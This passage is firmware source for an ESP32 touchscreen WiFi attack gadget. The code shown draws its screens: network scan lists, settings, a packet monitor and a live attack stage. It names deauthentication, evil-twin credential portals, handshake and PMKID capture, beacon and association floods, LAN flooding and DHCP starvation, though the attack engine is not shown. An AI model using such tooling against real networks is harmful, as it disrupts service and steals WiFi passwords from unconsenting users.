  String status=WiFi.status()==WL_CONNECTED?"WIFI CONNECTED":"SYSTEM READY  /  OFFLINE";
  drawTextFB(43,234,status,WHITE,1,fb,30);
  drawMainTile(8,253,148,46,"EXPLOIT","MODULES",0);
  drawMainTile(164,253,148,46,"SCAN","RADAR / APs",1);
  drawMainTile(8,307,148,46,"CONNECT WIFI","JOIN NETWORK",2);
  drawMainTile(164,307,148,46,"PACKET MON","PASSIVE RX",3);
  drawMainTile(8,361,148,46,"SETTINGS","THEMES / LCD",4);
  drawMainTile(164,361,148,46,"ABOUT","DEVICE INFO",5);
  footer(false);
}

static void serviceHomeAnimation(){
  if(screen!=MAIN || popup || !fb)return;
  uint32_t now=millis();
  if(homeAnimEpochMs==0)homeAnimEpochMs=now;
  if(now-homeAnimLastFrameMs<66)return;
  homeAnimLastFrameMs=now;
  drawHomeSkull(now-homeAnimEpochMs);
  lcdPushRect(fb,HOME_SKULL_X,HOME_SKULL_Y,HOME_SKULL_W,HOME_SKULL_H);
}

static uint16_t introBackgroundAt(int /*y*/){ return BLACK; }
static void drawIntroBase(){
  if(!fb)return;
  std::fill(fb,fb+(size_t)TFT_W*TFT_H,(uint16_t)0x0000);
}
static void introMascotGeometry(uint32_t elapsed,int &x,int &y,int &w,int &h){
  const float raw=constrain((float)elapsed/3150.0f,0.0f,1.0f);
  const float eased=raw*raw*(3.0f-2.0f*raw);
  h=(int)(58.0f+510.0f*eased);
  w=(int)((int64_t)h*SALARINI_MASCOT_W/SALARINI_MASCOT_H);
  x=(TFT_W-w)/2;
  y=(TFT_H-h)/2;
}
static void drawIntroFrame(uint32_t elapsed){
  int x,y,w,h;introMascotGeometry(elapsed,x,y,w,h);
  // The current frame's growing rectangle contains the previous one, so one
  // clipped erase prevents trails while retaining a black-only background.
  fillRectFB(max(0,x),max(0,y),min(TFT_W,x+w)-max(0,x),min(TFT_H,y+h)-max(0,y),(uint16_t)0x0000,fb);
  uint8_t frame;
  if(elapsed>2750) frame=5;
  else frame=(uint8_t)((elapsed/112UL)%5UL);
  drawSalariniSpriteScaled(frame,x,y,w,h);
}
static void serviceIntroAnimation(){
  if(screen!=INTRO||!fb)return;
  uint32_t now=millis();
  uint32_t elapsed=now-introStartMs;
  if(elapsed>=3300){transitionTo(disclaimerAccepted?MAIN:DISCL);return;}
  if(now-introLastFrameMs>=56){
    introLastFrameMs=now;
    drawIntroFrame(elapsed);
    int x,y,w,h;introMascotGeometry(elapsed,x,y,w,h);
    const int x0=max(0,x),y0=max(0,y),x1=min(TFT_W,x+w),y1=min(TFT_H,y+h);
    lcdPushRect(fb,x0,y0,x1-x0,y1-y0);
  }
}

static void drawScanPage(){
  clearFB();header("SCAN");
  roundedCardFB(12,61,296,69,13,DGRAY,surfaceColor(18),fb);
  drawTextFB(25,76,"ACCESS POINTS",GRAY,1,fb,20);
  drawTextFB(25,96,String(apCount),WHITE,2,fb,6);
  drawTextFB(58,104,"NETWORKS",CYAN,1,fb,10);
  roundedCardFB(12,148,296,54,13,CYAN,mix565(surfaceColor(15),CYAN,20),fb);
  drawTextFB(31,167,"SCAN ACCESS POINTS",WHITE,1,fb,26);drawTextFB(282,166,">",CYAN,1,fb,1);
  roundedCardFB(12,214,296,54,13,DGRAY,surfaceColor(18),fb);
  drawTextFB(31,233,"SCAN STATIONS",WHITE,1,fb,22);
  drawTextFB(31,252,String(ae::staCount())+" CLIENTS TRACKED",GRAY,1,fb,22);
  drawTextFB(282,232,">",YELLOW,1,fb,1);
  roundedCardFB(12,280,296,54,13,DGRAY,surfaceColor(18),fb);
  drawTextFB(31,299,"PACKET MONITOR",WHITE,1,fb,22);drawTextFB(282,298,">",CYAN,1,fb,1);
  drawTextFB(31,318,"PASSIVE RX + EAPOL COUNTER",GRAY,1,fb,26);
  footer();
}
static String displaySSID(const String &s,size_t maxLen){
  String t=sanitizeSSID(s,maxLen);
  if(t.length()>maxLen) return t.substring(0,maxLen-3)+"...";
  return t;
}
static void drawAPList(bool selectable){
  clearFB();header(pendingTargetAction?"CHOOSE TARGET":(wifiConnectMode?"CHOOSE WIFI":(selectable?"SELECT APS":"AP SCAN")));
  bool confirmMode=selectable && pendingSelectAttack!=ae::AttackType::NONE;
  const int top=54,rowH=52,maxRows=7;
  if(apCount==0){drawCenteredFB(160,"NO ACCESS POINTS",YELLOW,1,fb);footer();return;}
  if(listTop+maxRows>apCount && apCount>maxRows)listTop=(uint8_t)(apCount-maxRows);
  for(int r=0;r<maxRows;r++){
    size_t i=listTop+r;if(i>=apCount)break;int y=top+r*rowH;
    bool sel=selectable&&selectedAP[i];
    roundedCardFB(8,y,304,46,10,sel?GREEN:DGRAY,sel?mix565(surfaceColor(15),GREEN,24):surfaceColor(13),fb);
    drawTextFB(17,y+7,displaySSID(aps[i].ssid),WHITE,1,fb,31);
    // V21: the band gets its own colored tag - 5 GHz victims are now the
    // networks the evil twin handles best, so make them visible at a glance.
    // V22: RSSI colored by closeness + a 4-bar signal glyph. The list is
    // sorted strongest-first, so the top rows glow green and the weak
    // far-away networks sit red at the bottom.
    const uint16_t sigCol=(aps[i].rssi>=-55)?GREEN:((aps[i].rssi>=-70)?YELLOW:RED);
    // V24.2: row layout rebalanced. The old single string ("N  RSSI dBm  CH n")
    // could grow to ~20 glyphs (160 px) and ran straight into the signal bars
    // at x=150 - the "barra roza los textos" field report. Now the row is
    // split into fixed columns that can never touch:
    //   x=17  idx+rssi  (<=11 glyphs -> 105)   x=112  4-bar glyph (112..134)
    //   x=142 "CH n"    (<=6 glyphs  -> 190)   x=196  band tag   x=244 lock
    drawTextFB(17,y+26,String(i+1)+" "+String(aps[i].rssi)+"dBm",selectable?GRAY:sigCol,1,fb,11);
    const int bars=(aps[i].rssi>=-55)?4:((aps[i].rssi>=-62)?3:((aps[i].rssi>=-70)?2:((aps[i].rssi>=-80)?1:0)));
    for(int b=0;b<4;b++){
      const int bh=5+b*3, bx=112+b*6;
      fillRectFB(bx,y+39-bh,4,bh,(b<bars)?(sel?WHITE:sigCol):mix565(surfaceColor(13),WHITE,14),fb);
    }
    bool is5g=(aps[i].channel>14);
    drawTextFB(142,y+26,"CH "+String(aps[i].channel),selectable?GRAY:sigCol,1,fb,6);
    drawTextFB(196,y+26,bandForChannel(aps[i].channel),is5g?YELLOW:CYAN,1,fb,5);
    drawTextFB(244,y+26,aps[i].encrypted?"LOCK":"OPEN",aps[i].encrypted?CYAN:GREEN,1,fb,6);
    if(selectable){roundedCardFB(284,y+8,14,14,4,sel?GREEN:GRAY,sel?GREEN:surfaceColor(10),fb);if(sel)drawTextFB(287,y+9,"+",BLACK,1,fb,1);}
  }
  drawScrollbarV(top,top+maxRows*rowH,apCount,maxRows,(int)listTop);
  footer();
}
static void drawSettings(){
  clearFB();header("SETTINGS");
  const char *labels[]={"SELECT APS","SELECT STAS","BRIGHTNESS","ROTATE 180","ATTACK POWER","DUAL MODE","COLOR THEME","SD CARD","HOW TO USE","POWER INFO"};
  const int rowH=37,cardH=33;
  for(int i=0;i<10;i++){
    int y=52+i*rowH;
    roundedCardFB(12,y,296,cardH,9,DGRAY,surfaceColor(17),fb);
    drawTextFB(22,y+9,labels[i],(i==1)?YELLOW:((i==5)?CYAN:WHITE),1,fb,24);
    if(i==2)drawTextFB(247,y+9,String(brightness)+"%",CYAN,1,fb,5);
    else if(i==3){drawPillFB(244,y+4,52,25,rot180?mix565(surfaceColor(10),GREEN,35):surfaceColor(10),DGRAY,fb);drawTextCenteredInRect(244,y+4,52,25,rot180?"ON":"OFF",rot180?GREEN:GRAY,1,fb);}
    else if(i==4){const char* pl=(ae::powerLevel()==ae::Power::PWR_LOW)?"LOW":((ae::powerLevel()==ae::Power::PWR_MAX)?"MAX":"MED");drawTextFB(247,y+9,pl,GREEN,1,fb,3);}
    else if(i==5){drawPillFB(244,y+4,52,25,dualModeOn?mix565(surfaceColor(10),GREEN,45):surfaceColor(10),DGRAY,fb);drawTextCenteredInRect(244,y+4,52,25,dualModeOn?"ON":"OFF",dualModeOn?GREEN:GRAY,1,fb);}
    else if(i==6){String nm=String(THEME_PALETTES[themeIndex].name);drawTextFB(189,y+9,nm,CYAN,1,fb,13);}
    else drawTextFB(285,y+9,">",CYAN,1,fb,1);
  }
  footer();
}
static void drawThemePicker(){
  clearFB();header("COLOR THEMES");
  for(uint8_t i=0;i<THEME_COUNT;i++){
    const int y=52+(int)i*56;const ThemePalette &p=THEME_PALETTES[i];
    roundedCardFB(10,y,300,48,11,(i==themeIndex)?p.accent:p.border,p.bg,fb);
    drawTextFB(22,y+18,p.name,p.text,1,fb,16);
    fillRoundRectFB(190,y+13,25,22,6,p.text,fb);roundedCardFB(190,y+13,25,22,6,p.border,p.text,fb);
    fillRoundRectFB(220,y+13,25,22,6,p.accent,fb);
    fillRoundRectFB(250,y+13,25,22,6,p.good,fb);
    if(i==themeIndex)drawTextFB(282,y+19,"OK",p.accent,1,fb,2);
  }
  footer();
}
static void drawBrightness(){
  clearFB();header("BRIGHTNESS");
  drawCenteredFB(66,String(brightness)+"%",CYAN,4,fb);
  drawCenteredFB(116,"DISPLAY BACKLIGHT",GRAY,1,fb);
  const int x0=28,x1=292,y=160,w=x1-x0;
  fillRoundRectFB(x0,y,w,24,12,surfaceColor(28),fb);
  int fillW=((w-8)*brightness+50)/100;
  if(fillW>0)fillRoundRectFB(x0+4,y+4,fillW,16,8,CYAN,fb);
  int knob=constrain(x0+4+fillW,x0+10,x1-10);
  fillCircleFB(knob,y+12,9,WHITE,fb);fillCircleFB(knob,y+12,4,CYAN,fb);
  const int marks[]={0,25,50,75,100};
  for(int value:marks){int mx=x0+4+((w-8)*value+50)/100;fillCircleFB(mx,y+36,2,GRAY,fb);}
  drawCenteredFB(y+46,"0       25       50       75       100",GRAY,1,fb);
  roundedCardFB(18,242,86,48,13,DGRAY,surfaceColor(18),fb);drawTextCenteredInRect(18,242,86,48,"-10",WHITE,2,fb);
  roundedCardFB(117,242,86,48,13,CYAN,mix565(surfaceColor(18),CYAN,17),fb);drawTextCenteredInRect(117,242,86,48,"+10",WHITE,2,fb);
  roundedCardFB(216,242,86,48,13,DGRAY,surfaceColor(18),fb);drawTextCenteredInRect(216,242,86,48,"100",GREEN,2,fb);
  drawCenteredFB(325,"DRAG THE SLIDER FOR PRECISE CONTROL",GRAY,1,fb);
  footer();
}

static void drawPower(){
  clearFB();header("POWER");
  roundedCardFB(10,57,300,44,12,DGRAY,surfaceColor(17),fb);drawTextFB(23,73,"AXP2101 POWER MANAGER",WHITE,1,fb,24);drawTextFB(250,74,pmuOK?"READY":"FAIL",pmuOK?GREEN:RED,1,fb,6);
  roundedCardFB(10,108,300,44,12,DGRAY,surfaceColor(17),fb);drawTextFB(23,124,"BATTERY",WHITE,1,fb,12);drawTextFB(224,124,batPresent?"PRESENT":"NONE",batPresent?GREEN:YELLOW,1,fb,9);
  drawPowerBatteryPanel();drawPowerTelemetry();footer();
}

static void drawPowerBatteryPanel(){
  roundedCardFB(10,160,300,68,14,CYAN,mix565(surfaceColor(15),CYAN,10),fb);
  drawTextFB(24,177,"BATTERY LEVEL",GRAY,1,fb,18);
  drawTextFB(24,195,batPercent<0?"--%":String(batPercent)+"%",WHITE,2,fb,5);
  drawTextFB(126,203,batPercentSource,GRAY,1,fb,10);
  int pct=constrain(batPercent,0,100);fillRoundRectFB(24,217,270,5,3,surfaceColor(38),fb);
  if(pct>0)fillRoundRectFB(24,217,(270*pct)/100,5,3,batCharging?GREEN:CYAN,fb);
}
static void drawPowerTelemetry(){
  roundedCardFB(10,236,300,46,12,DGRAY,surfaceColor(17),fb);drawTextFB(23,253,"VBAT",WHITE,1,fb,8);drawTextFB(91,253,String(batMv)+" mV",CYAN,1,fb,10);drawTextFB(215,253,"RAW "+(batGaugePercent<0?String("--"):String(batGaugePercent))+"%",GRAY,1,fb,10);
  roundedCardFB(10,290,300,46,12,DGRAY,surfaceColor(17),fb);drawTextFB(23,307,"USB / VBUS",WHITE,1,fb,12);drawTextFB(123,307,String(vbusMv)+" mV",CYAN,1,fb,10);drawTextFB(235,307,vbusPresent?"IN":"OFF",vbusPresent?GREEN:GRAY,1,fb,5);
  roundedCardFB(10,344,300,46,12,DGRAY,surfaceColor(17),fb);drawTextFB(23,361,batCharging?"CHARGING":(batDischarging?"DISCHARGING":"IDLE"),batCharging?GREEN:(batDischarging?YELLOW:WHITE),1,fb,13);drawTextFB(181,361,"CHG "+String(chargerStatusText()),WHITE,1,fb,12);
  fillRectFB(18,396,284,18,BLACK,fb);drawTextFB(22,400,"SYSTEM "+String(sysMv)+" mV  /  FUEL GAUGE",GRAY,1,fb,36);
}

static void drawConnectWifi(){
  clearFB();header("CONNECT WIFI");
  const bool connected=(WiFi.status()==WL_CONNECTED);
  roundedCardFB(12,57,296,76,14,DGRAY,surfaceColor(17),fb);
  fillCircleFB(27,75,3,connected?GREEN:YELLOW,fb);
  drawTextFB(38,70,connected?"CONNECTED":"NOT CONNECTED",connected?GREEN:YELLOW,1,fb,24);
  String ss=connected?sanitizeSSID(WiFi.SSID(),30):"Choose a network to join";
  drawTextFB(22,91,ss,WHITE,1,fb,34);
  drawTextFB(22,111,connected?WiFi.localIP().toString():"Saved only for this session",GRAY,1,fb,34);
  roundedCardFB(12,151,296,46,13,CYAN,mix565(surfaceColor(16),CYAN,18),fb);drawTextFB(28,167,apCount?"SHOW SCANNED NETWORKS":"SCAN NETWORKS",WHITE,1,fb,25);drawTextFB(282,166,">",CYAN,1,fb,1);
  roundedCardFB(12,207,296,46,13,DGRAY,surfaceColor(17),fb);drawTextFB(28,223,"ENTER SSID / PASSWORD",WHITE,1,fb,27);drawTextFB(282,222,">",CYAN,1,fb,1);
  roundedCardFB(12,263,296,46,13,DGRAY,surfaceColor(17),fb);drawTextFB(28,279,"DISCONNECT",YELLOW,1,fb,20);
  roundedCardFB(12,319,296,46,13,DGRAY,surfaceColor(17),fb);drawTextFB(28,335,"WIFI DETAILS",WHITE,1,fb,18);drawTextFB(282,334,">",CYAN,1,fb,1);
  roundedCardFB(12,375,296,46,13,RED,mix565(surfaceColor(16),RED,22),fb);drawTextFB(28,391,"IN-NET ATTACKS",connected?WHITE:GRAY,1,fb,20);drawTextFB(282,390,">",RED,1,fb,1);
  footer();
}

static void keyButton(int x,int y,int w,int h,const String &label,bool active=false){
  uint16_t fill=active?mix565(surfaceColor(18),CYAN,28):surfaceColor(25);
  roundedCardFB(x,y,w,h,max(5,min(10,h/3)),active?CYAN:DGRAY,fill,fb);
  uint8_t scale=2;
  while(scale>1 && (int)label.length()*8*scale>w-6)scale--;
  while(scale>1 && 20>h-6)scale--;
  int tw=(int)label.length()*8*scale;
  int tx=x+(w-tw)/2;if(tx<x+3)tx=x+3;
  int glyphH=scale==1?10:20;
  int ty=y+(h-glyphH)/2;
  drawTextFB(tx,ty,label,active?WHITE:WHITE,scale,fb,max(1,(w-4)/(8*scale)));
}

static void drawWifiKeyboard(){
  clearFB();
  header(keyboardPurpose==KEY_WIFI_SSID?String("ENTER SSID"):
         (keyboardPurpose==KEY_ATTACK_TEXT?String("BEACON PREFIX"):
          (keyboardPurpose==KEY_ET_MSG?String("PORTAL MESSAGE"):
           (keyboardPurpose==KEY_ET_PASS?String("REAL WIFI PASSWORD"):String("WIFI PASSWORD")))));
  roundedCardFB(10,54,300,45,12,CYAN,surfaceColor(18),fb);
  String label=(keyboardPurpose==KEY_WIFI_SSID)?String("SSID: "):
                (keyboardPurpose==KEY_ATTACK_TEXT?String("TXT: "):
                 (keyboardPurpose==KEY_ET_MSG?String("MSG: "):
                  (keyboardPurpose==KEY_ET_PASS?String("REAL: "):String("PASS: "))));
  String visible=keyboardBuffer;
  if(visible.length()>30) visible=visible.substring(visible.length()-30);
  drawTextFB(18,66,label+visible,WHITE,1,fb,36);
  int cursorX=18+(int)(label.length()+visible.length())*8;
  cursorX=constrain(cursorX,20,304);
  fillRoundRectFB(cursorX,63,2,18,1,CYAN,fb);

  if(!keyboardSymbols){
    const char *r0="qwertyuiop",*r1="asdfghjkl",*r2="zxcvbnm";
    for(int i=0;i<10;i++) keyButton(11+i*30,108,28,36,String((char)(keyboardUpper?r0[i]-32:r0[i])));
    for(int i=0;i<9;i++) keyButton(13+i*33,148,30,36,String((char)(keyboardUpper?r1[i]-32:r1[i])));
    keyButton(6,188,48,36,keyboardUpper?"SHIFT*":"SHIFT",keyboardUpper);
    for(int i=0;i<7;i++) keyButton(58+i*30,188,28,36,String((char)(keyboardUpper?r2[i]-32:r2[i])));
    keyButton(273,188,41,36,"DEL");
    keyButton(6,232,55,38,"?123",true);
    keyButton(64,232,95,38,"SPACE");
    keyButton(164,232,42,38,"DEL");
    keyButton(209,232,42,38,"CLR");
    keyButton(254,232,60,38,"OK",true);
  }else{
    const char *rows[]={"1234567890","!@#$%^&*()","-_=+[]{}\\|",";:'\",.<>/?`~"};
    const int ys[]={108,146,184,222};
    for(int row=0;row<4;row++){
      int n=(int)strlen(rows[row]);
      const int kw=(n==12)?23:28;
      const int gap=2, startX=11;
      for(int i=0;i<n;i++) keyButton(startX+i*(kw+gap),ys[row],kw,34,String(rows[row][i]));
    }
    keyButton(6,262,55,38,"ABC",true);
    keyButton(64,262,95,38,"SPACE");
    keyButton(164,262,42,38,"DEL");
    keyButton(209,262,42,38,"CLR");
    keyButton(254,262,60,38,"OK",true);
  }
  const int actionY=keyboardSymbols?310:280;
  keyButton(8,actionY,90,40,"CANCEL");
  keyButton(104,actionY,90,40,"CLEAR");
  keyButton(200,actionY,112,40,keyboardPurpose==KEY_WIFI_PASSWORD?String("CONNECT"):(keyboardPurpose==KEY_ET_PASS||keyboardPurpose==KEY_ET_MSG?String("DONE"):String("OK")),true);
  drawCenteredFB(actionY+48,"TAP KEYS TO TYPE",GRAY,1,fb);
  drawCenteredFB(actionY+66,keyboardPurpose==KEY_WIFI_SSID?String("MAX 32 CHARACTERS"):
            (keyboardPurpose==KEY_ATTACK_TEXT?String("MAX 20 CHARACTERS"):
             (keyboardPurpose==KEY_ET_MSG?String("MAX 120 - SHOWN ON THE PORTAL"):
              (keyboardPurpose==KEY_ET_PASS?String("EMPTY = SKIP / VERIFY LATER"):String("MAX 63 CHARACTERS")))),GRAY,1,fb);
  footer();
}

static void drawWifiConnecting(){
  clearFB();header("CONNECTING WIFI");
  roundedCardFB(12,64,296,292,18,CYAN,surfaceColor(17),fb);
  const int cx=160,cy=174;
  drawCircleFB(cx,cy,22,mix565(BLACK,CYAN,45),fb);drawCircleFB(cx,cy,42,mix565(BLACK,CYAN,45),fb);drawCircleFB(cx,cy,62,mix565(BLACK,CYAN,45),fb);
  float a=(float)(wifiConnectAnimPhase%32)*0.19634954f;
  int ex=cx+(int)(cosf(a)*57.0f),ey=cy+(int)(sinf(a)*57.0f);
  drawLineFB(cx,cy,ex,ey,CYAN,fb);fillCircleFB(ex,ey,5,GREEN,fb);
  drawCenteredFB(252,"CONNECTING TO",GRAY,1,fb);
  drawCenteredFB(274,sanitizeSSID(wifiTargetSSID,30),WHITE,1,fb);
  drawPillFB(48,301,224,7,surfaceColor(40),DGRAY,fb);
  int shift=(wifiConnectAnimPhase*13)%220;fillRoundRectFB(50+shift,303,38,3,2,CYAN,fb);
  drawCenteredFB(326,"WAITING FOR ROUTER",GRAY,1,fb);
  footer();
}

static void drawWifiDetails(){
  clearFB();header("WIFI DETAILS");
  bool connected=(WiFi.status()==WL_CONNECTED);
  const char *labs[]={"STATUS","SSID","IP ADDRESS","SIGNAL","CHANNEL"};
  String vals[]={connected?"CONNECTED":"DISCONNECTED",sanitizeSSID(WiFi.SSID(),32),WiFi.localIP().toString(),String(connected?WiFi.RSSI():0)+" dBm",String(connected?WiFi.channel():0)};
  for(int i=0;i<5;i++){
    int y=65+i*55;roundedCardFB(12,y,296,46,12,DGRAY,surfaceColor(17),fb);
    drawTextFB(23,y+8,labs[i],GRAY,1,fb,14);
    drawTextFB(23,y+24,vals[i],(i==0&&connected)?GREEN:(i==2?CYAN:WHITE),1,fb,34);
  }
  drawCenteredFB(350,"STANDARD WIFI CLIENT MODE",GRAY,1,fb);
  footer();
}

static void drawAbout(){
  clearFB();header("ABOUT");
  roundedCardFB(12,60,296,74,15,DGRAY,surfaceColor(20),fb);
  drawTextFB(25,76,"SALARINI C5 TOUCH",WHITE,1,fb,22);
  drawTextFB(25,107,"V26 / SMART ATK + MAC SPOOF",CYAN,1,fb,28);
  const char *rows[]={"LCD DISPLAY     ST7796 320x480","TOUCH           FT6336","POWER           AXP2101","BACKLIGHT       CH32","SIGNAL-SORTED POWER SCAN","DUAL MODE + DUO DRONE","SMART ATTACK + MAC SPOOF"};
  for(int i=0;i<7;i++){
    int y=151+i*34;
    fillRectFB(18,y+28,284,1,mix565(BLACK,WHITE,25),fb);
    drawTextFB(22,y,rows[i],(i==4||i==5)?GREEN:(i==6?YELLOW:WHITE),1,fb,36);
  }
  drawTextFB(22,399,String("FLASH ")+String((unsigned long)(ESP.getFlashChipSize()/1024/1024))+"MB  PSRAM "+String((unsigned long)(ESP.getPsramSize()/1024/1024))+"MB",GRAY,1,fb,36);
  footer();
}
static void monitorTab(int x,int y,int w,const char *label,bool selected){
  uint16_t fill=selected?mix565(surfaceColor(16),CYAN,27):surfaceColor(12);
  roundedCardFB(x,y,w,25,8,selected?CYAN:DGRAY,fill,fb);
  drawTextCenteredInRect(x,y,w,25,label,selected?WHITE:GRAY,1,fb);
}
static uint32_t monitorCount(uint8_t index){return index<MONITOR_CHANNEL_COUNT?(uint32_t)pktByChannel[index]:0;}
static void drawPacket(){
  clearFB();header("PACKET MONITOR");
  monitorTab(8,51,96,"SUMMARY",monitorView==0);
  monitorTab(111,51,96,"TYPES",monitorView==1);
  monitorTab(214,51,98,"CHANNELS",monitorView==2);
  String channelLine=String("TUNED CH ")+String(monitorTuneChannel)+"  "+(monitorTuneChannel<=14?"2.4G":"5G");
  drawTextFB(12,82,channelLine,CYAN,1,fb,20);
  drawTextFB(230,82,String(pktRate)+" PPS",WHITE,1,fb,10);
  if(monitorView==0){
    const char* labels[]={"TOTAL FRAMES","MANAGEMENT","BEACONS","PROBE REQ / RESP","AUTH / ASSOC","DEAUTH / DISASSOC","DATA / CONTROL"};
    uint32_t vals[]={(uint32_t)pktTotal,(uint32_t)pktMgmt,(uint32_t)pktBeacon,(uint32_t)(pktProbeReq+pktProbeResp),(uint32_t)(pktAuth+pktAssoc),(uint32_t)(pktDeauth+pktDisassoc),(uint32_t)(pktData+pktCtrl)};
    uint16_t cols[]={WHITE,CYAN,GREEN,YELLOW,CYAN,YELLOW,GREEN};
    for(int i=0;i<7;i++){
      int y=103+i*42;
      roundedCardFB(12,y,296,36,10,DGRAY,surfaceColor(15),fb);
      drawTextFB(23,y+13,labels[i],GRAY,1,fb,22);
      drawTextFB(247,y+13,String((unsigned long)vals[i]),cols[i],1,fb,8);
    }
    drawTextFB(18,403,"PASSIVE RX  /  NO FRAMES SENT",GREEN,1,fb,31);
  }else if(monitorView==1){
    const char *labs[]={"BEACONS","PROBE REQ","PROBE RESP","AUTH","ASSOC / REASSOC","DEAUTH OBSERVED","DISASSOC OBSERVED","ACTION MGMT","DATA FRAMES","CONTROL FRAMES"};
    uint32_t vals[]={(uint32_t)pktBeacon,(uint32_t)pktProbeReq,(uint32_t)pktProbeResp,(uint32_t)pktAuth,(uint32_t)pktAssoc,(uint32_t)pktDeauth,(uint32_t)pktDisassoc,(uint32_t)pktAction,(uint32_t)pktData,(uint32_t)pktCtrl};
    for(int i=0;i<10;i++){
      int x=(i%2)?164:12;int y=103+(i/2)*60;
      roundedCardFB(x,y,144,53,10,DGRAY,surfaceColor(15),fb);
      drawTextFB(x+9,y+9,labs[i],GRAY,1,fb,16);
      drawTextFB(x+9,y+29,String((unsigned long)vals[i]),(i==5)?YELLOW:CYAN,1,fb,12);
    }
    drawTextFB(17,408,String("OTHER MGMT: ")+String((unsigned long)pktOtherMgmt),GRAY,1,fb,25);
  }else{
    monitorTab(12,81,140,"2.4 GHz",!monitor5GView);
    monitorTab(168,81,140,"5 GHz",monitor5GView);
    uint8_t shown=0;uint32_t maxCount=1;
    const uint8_t start=monitor5GView?13:0;
    const uint8_t end=monitor5GView?MONITOR_CHANNEL_COUNT:13;
    for(uint8_t i=start;i<end;i++)if(monitorCount(i)>maxCount)maxCount=monitorCount(i);
    int rowH=monitor5GView?16:22;int y0=monitor5GView?112:112;
    for(uint8_t i=start;i<end;i++,shown++){
      int y=y0+(int)shown*rowH;
      if(y+rowH>425)break;
      uint8_t ch=MONITOR_CHANNELS[i];
      drawTextFB(12,y+3,String(ch<100?"CH ":"CH")+String(ch),WHITE,1,fb,5);
      fillRoundRectFB(62,y+5,164,monitor5GView?6:9,4,surfaceColor(20),fb);
      uint32_t count=monitorCount(i);
      int bw=(int)((uint64_t)count*164/maxCount);
      if(bw>0)fillRoundRectFB(62,y+5,min(164,bw),monitor5GView?6:9,4,CYAN,fb);
      drawTextFB(233,y+3,String((unsigned long)count),GRAY,1,fb,10);
    }
  }
  footer();
}
// ------------------------- Live attack screen ------------------------
// V20: loader-style stage. A Windows-style spinning-dot loader with the
// attack action below it; information screens appear ONLY where needed
// (the evil portal terminal, the handshake key states and the net-scan
// host list).
static String attackElapsedText(uint32_t startedMs){
  uint32_t s=(millis()-startedMs)/1000UL;
  return String((unsigned)((s/60)%100))+":"+(s%60<10?"0":"")+String((unsigned)(s%60));
}

// ------------------- ATTACK STAGE (V20 spinner UI) -------------------
// One consistent look for every attack: a Windows-style spinning-dot loader
// with the attack action written below it. No per-attack cartoons, no tx
// counters. Screens that need real information (evil portal terminal,
// handshake key states, net-scan host list) show that information instead
// of the loader.
static constexpr int STAGE_X=8, STAGE_Y=52, STAGE_W=304, STAGE_H=372;
static constexpr int STAGE_CX=160, STAGE_CY=210;

static void stageClear(){
  fillRectFB(STAGE_X,STAGE_Y,STAGE_W,STAGE_H,BLACK,fb);
}

// Windows-style loader: 8 dots chase each other around a ring, the head dot
// is bright and the tail fades out.
static void drawWinSpinner(int cx,int cy,uint32_t t,uint16_t color){
  const uint8_t N=8;
  float head=((float)(t%1100))/1100.0f*6.28318f;
  for(uint8_t i=0;i<N;i++){
    float a=head-(float)i*(6.28318f/N);
    int x=cx+(int)(cosf(a)*46.0f),y=cy+(int)(sinf(a)*46.0f);
    uint8_t fade=(uint8_t)max(10,100-(int)i*13);
    fillCircleFB(x,y,(i==0)?6:5,mix565(BLACK,color,fade),fb);
  }
}

// Human-readable action line for whatever is running right now.
static String attackActionText(){
  if(sBLECarrierActive) return "BLE SPAMMING";
  if(ae::attackType()==ae::AttackType::FIND_WIFI) return "FINDING THEIR WIFI";
  if(lan::active()){
    switch(lan::mode()){
      case lan::Mode::NETSCAN:     return "SCANNING HOSTS";
      case lan::Mode::UDP_FLOOD:   return "UDP FLOODING";
      case lan::Mode::TCP_FLOOD:   return "TCP FLOODING";
      case lan::Mode::HTTP_FLOOD:  return "HTTP FLOODING";
      case lan::Mode::DHCP_STARVE: return "DHCP STARVING";
      case lan::Mode::SSDP_FLOOD:  return "SSDP FLOODING";
      default:                     return "LAN APOCALYPSE";
    }
  }
  switch(ae::attackType()){
    case ae::AttackType::DEAUTH_TWO_WAY:      return "DEAUTHING 2-WAY";
    case ae::AttackType::CLIENT_HUNT:         return "HUNTING CLIENTS";
    case ae::AttackType::PROBE_FLOOD:         return "PROBE FLOODING";
    case ae::AttackType::PROBE_KARMA:         return "KARMA PROBING";
    case ae::AttackType::AUTH_ALL: case ae::AttackType::AUTH_CHANNEL:
    case ae::AttackType::AUTH_SELECTED:       return "AUTH FLOODING";
    case ae::AttackType::ASSOC_ALL: case ae::AttackType::ASSOC_CHANNEL:
    case ae::AttackType::ASSOC_SELECTED:      return "ASSOC FLOODING";
    case ae::AttackType::BEACON_RICKROLL:     return "RICKROLL BEACONS";
    case ae::AttackType::DEAUTH_RICKROLL:     return "DEAUTH + RICKROLL";
    case ae::AttackType::BEACON_DUP_ALL: case ae::AttackType::BEACON_DUP_SELECTED:
    case ae::AttackType::BEACON_RANDOM: case ae::AttackType::BEACON_CHANNEL:
    case ae::AttackType::BEACON_PREFIX: case ae::AttackType::BEACON_FAKERANDOM:
                                              return "BEACON FLOODING";
    case ae::AttackType::SPOOF_AP:            return "SPOOFING AP";
    case ae::AttackType::EVIL_TWIN:           return "EVIL TWIN LIVE";
    case ae::AttackType::TOTAL_OUTAGE:        return "TOTAL OUTAGE";
    case ae::AttackType::EAPOL_FLOOD:         return "EAPOL FLOODING";
    case ae::AttackType::QOS_NULL_FLOOD:      return "QOS NULL FLOODING";
    case ae::AttackType::RTS_FLOOD:           return "RTS FLOODING";
    default:                                  return "DEAUTHING";
  }
}

// The generic loader stage for every "no info needed" attack.
static void drawAttackSpinner(const String &actionText){
  if(!fb)return;
  stageClear();
  roundedCardFB(STAGE_X,STAGE_Y,STAGE_W,STAGE_H,14,DGRAY,BLACK,fb);
  drawWinSpinner(STAGE_CX,STAGE_CY,millis(),CYAN);
  drawCenteredFB(STAGE_CY+92,actionText,WHITE,2,fb);
}

// HANDSHAKE / PMKID information panel (information instead of animation).
static void drawHsInfo(){
  if(!fb)return;
  stageClear();
  roundedCardFB(STAGE_X,STAGE_Y,STAGE_W,STAGE_H,14,DGRAY,BLACK,fb);
  const ae::HSState *hs=ae::hsState();
  bool pmkid=(ae::attackType()==ae::AttackType::PMKID_GRAB);
  drawTextFB(24,STAGE_Y+24,pmkid?"PMKID CAPTURE":"HANDSHAKE CAPTURE",CYAN,2,fb,18);
  drawTextFB(24,STAGE_Y+66,"TARGET",GRAY,1,fb,10);
  drawTextFB(24,STAGE_Y+82,ae::attackTarget().length()?ae::attackTarget():String("LOCKED AP"),WHITE,1,fb,36);
